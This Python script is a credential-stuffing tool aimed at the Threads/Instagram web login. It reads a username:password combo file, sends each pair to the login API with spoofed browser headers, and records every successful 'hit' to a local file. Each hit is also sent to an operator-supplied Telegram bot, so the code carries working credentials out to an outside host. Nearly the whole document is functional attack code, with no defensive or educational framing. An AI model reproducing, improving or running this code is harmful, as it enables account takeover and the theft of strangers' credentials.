from random import choice
from requests import post
from urllib.parse import quote
import requests
import user_agent
import os
import pyfiglet
import colorama
from user_agent import generate_user_agent
from time import sleep as wh
import json, requests ,uuid,random,base64
import time
import requests,time,datetime
time1 = time.localtime()
time2 = time.strftime('''%d/%m/%Y''')
now = datetime.datetime.now()
current_time = now.strftime("%I:%M:%S")
G1 = '\x1b[1;97m'
G2 = '\x1b[38;5;196m'
G3 = '\x1b[1;33m'
G4 = '\x1b[1;96m'
G5 = '\x1b[38;5;8m'
G6 = '\x1b[38;5;48m'
G7 = '\x1b[38;5;47m'
G8 = '\x1b[38;5;49m'
G9 = '\x1b[38;5;50m'
G10 = '\x1b[1;34m'
G11 = '\x1b[38;5;14m'
G12 = '\x1b[38;5;123m'
G13 = '\x1b[38;5;122m'
G14 = '\x1b[38;5;86m'
G14 = '\x1b[38;5;121m'
G15 = '\x1b[38;5;205m'
G16 = '\x1b[1;92m\x1b[38;5;208m'
G17 = '\x1b[1;92m\x1b[38;5;209m'
G18 = '\x1b[1;92m\x1b[38;5;210m'
G19 = '\x1b[1;92m\x1b[38;5;211m'
G20 = '\x1b[1;92m\x1b[38;5;212m'
G21 = '\x1b[1;92m\x1b[38;5;46m'
G23 = '\x1b[1;92m\x1b[38;5;47m'
G24 = '\x1b[1;92m\x1b[38;5;48m'
G25 = '\x1b[1;92m\x1b[38;5;49m'
G26 = '\x1b[1;92m\x1b[38;5;50m'
Goldid = input(f'{G17} - Enter ID Telegram ==>    ')
print(f"{G19}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
Goldtok = input(f'{G18} - Enter TOKEN Telegram ==>    ')
print(f"{G19}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
file_Golden = input(f'{G14} - Enter File password ==>    ')
print(f"{G19}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def Golden():
    for i in open(file_Golden, "r").read().splitlines():
        if ":" in i:
            password_Golden = i.split(":")[1]
            Username_Golden = i.split(":")[0]
            headers = {
                'accept': '*/*',
                'accept-language': 'ar,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': 'csrftoken=GnURfrmxvGIMFmVZqe-p6J; mid=ZhVcMgALAAFmt9d4nhJei1trOp4h; ig_did=6A6D88F0-5777-453A-8209-E5EB212DE43F; ps_n=0; ps_l=0',
                'dnt': '1',
                'dpr': '1',
                'origin': 'https://www.threads.net',
                'referer': 'https://www.threads.net/login',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="123.0.2420.81", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.106"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': generate_user_agent(),
                'viewport-width': '825',
                'x-asbd-id': '129477',
                'x-csrftoken': 'GnURfrmxvGIMFmVZqe-p6J',
                'x-ig-app-id': '238260118697367',
                'x-instagram-ajax': '0',
            }
            tim33 = str(time.time()).split('.')[0]
            data = {
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim33}:{password_Golden}',
                'optIntoOneTap': 'false',
                'queryParams': '{}',
                'stopDeletionNonce': '',
                'textAppStopDeletionToken': '',
                'username': f'{Username_Golden}',
            }

            response = requests.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
            if 'userId' in response.text:
                print(f'{G21}Done ==> {Username_Golden} : {password_Golden}')
                Goldentele =(f"""
[ ✅ ] account Hit 
═════════════════➢
[✅] Username   » {Username_Golden}

[✅] Password  » {password_Golden}

[✅] Time    » {current_time}

[✅] Date   » {time2}
═════════════════➢
[🤴🏻]  => @rrrrrf""")
                requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(Goldentele))
                with open('instagram_Golden.txt', 'a') as x:
                    x.write(Username_Golden + ":" + password_Golden + '\n')
            else:
                print(f'{G2}ERROR ==> {Username_Golden} : {password_Golden}')
Golden()